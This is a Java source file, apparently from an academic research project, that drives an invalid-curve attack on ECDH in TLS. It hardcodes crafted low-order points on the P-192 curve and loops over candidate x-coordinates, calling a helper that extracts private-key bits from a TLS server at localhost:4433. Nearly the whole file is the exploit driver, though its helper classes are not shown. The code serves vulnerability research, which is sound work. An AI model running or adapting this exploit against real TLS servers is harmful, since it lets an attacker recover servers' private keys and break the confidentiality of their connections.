/*
 * 
 */
package de.rub.nds.ecdhattack;

import de.rub.nds.ecdhattack.utilities.NastyPoint;
import de.rub.nds.ecdhattack.utilities.TLSConnector;
import de.rub.nds.ssl.stack.ECUtility;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.EECPointFormat;
import java.io.IOException;
import java.math.BigInteger;
import java.net.SocketException;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class TestRunner {

    private static final String HOST = "localhost";
    private static final int PORT = 4433;
//    private static final String X = "82014859963010894574757305244210625734697257313587897329404982989788567941499";
//    private static final String Y = "1908267400714237267241946255076265219399988738601471281109513294166199342120";
    // p=7, p192r
//    private static final String testX = "468b7d8c1d145b0817359578142f3a2465086c3a471c2126";
//    private static final String testY = "61852e76434a667811f47f1fc4f80d69df3bcdccdc13f716";
//    private static final String[] xPossibilities = {"468b7d8c1d145b0817359578142f3a2465086c3a471c2126", "4add3c504b29025ae98903862369c39edb8d07d36da502b1", "178e496f67c822b0d33636bcb1e046f716d8d978d6e4cbc", "9d42769dfdbe113a851bb6b01b1a515d893b5adbc1f61329"};

//    // p=13, p192r
//    private static final String testX = "76589f2ed0abdd057c53f3fdb0967f1ccd0c163678abbd2f";
//    private static final String testY = "f477df969291aa657abbd5fe1b5029f42371f00097db361d";
//    private static final String[] xPossibilities = {"76589f2ed0abdd057c53f3fdb0967f1ccd0c163678abbd2f"};//, "8a5405cf499582658ec531f3e11f8e5817e4a23299498420", "a459e0997963efa4ad340fc05e9e84f2f3e9c263975879ec", "a9c9f875c516b88f1c0566bfcdb89971c07f35cadee43001", "a3f89557eca0884012245b842df4004d463955a5fc49cde8", "c3e96e608fbe21001edbb8d7bdb770654735741679f100b9", "39985f42bb69a201c9f3665df223038d32411f284f3cff6a", "2248a94f1163665ff86766f55f268f1f167099d3d8797841", "763366d7eb2fede31275dbe74170537feed941136680041f"};
    // p=7, p192r
    private static final String testX = "4add3c504b29025ae98903862369c39edb8d07d36da502b1";
    private static final String testY = "432c8c3cc679d907bb56a7af231d9b8f7a14203d704526dc";
    private static final String[] xPossibilities = {"4add3c504b29025ae98903862369c39edb8d07d36da502b1"};//, "8a5405cf499582658ec531f3e11f8e5817e4a23299498420", "a459e0997963efa4ad340fc05e9e84f2f3e9c263975879ec", "a9c9f875c516b88f1c0566bfcdb89971c07f35cadee43001", "a3f89557eca0884012245b842df4004d463955a5fc49cde8", "c3e96e608fbe21001edbb8d7bdb770654735741679f100b9", "39985f42bb69a201c9f3665df223038d32411f284f3cff6a", "2248a94f1163665ff86766f55f268f1f167099d3d8797841", "763366d7eb2fede31275dbe74170537feed941136680041f"};
    
    public void launchAttack() throws SocketException, InterruptedException {
        TLSConnector tlsConnector = new TLSConnector(HOST, PORT);
        byte[] encodedNastyPoint;

        NastyPoint point = new NastyPoint();
        point.x = new BigInteger(testX, 16);
        point.y = new BigInteger(testY, 16);
        encodedNastyPoint = ECUtility.encodeX9_62(point.x.toByteArray(),
                point.y.toByteArray(), EECPointFormat.UNCOMPRESSED);

        // start the handshake
        for (String possibility : xPossibilities) {
            BigInteger x = new BigInteger(possibility, 16);
            tlsConnector.launchBitExtraction(encodedNastyPoint, x.toByteArray());
        }
    }

    /**
     * @param args the command line arguments
     * @throws FileNotFoundException
     * @throws IOException
     * @throws InterruptedException
     */
    public static void main(final String[] args) throws
            SocketException, InterruptedException {
        new TestRunner().launchAttack();
    }
}
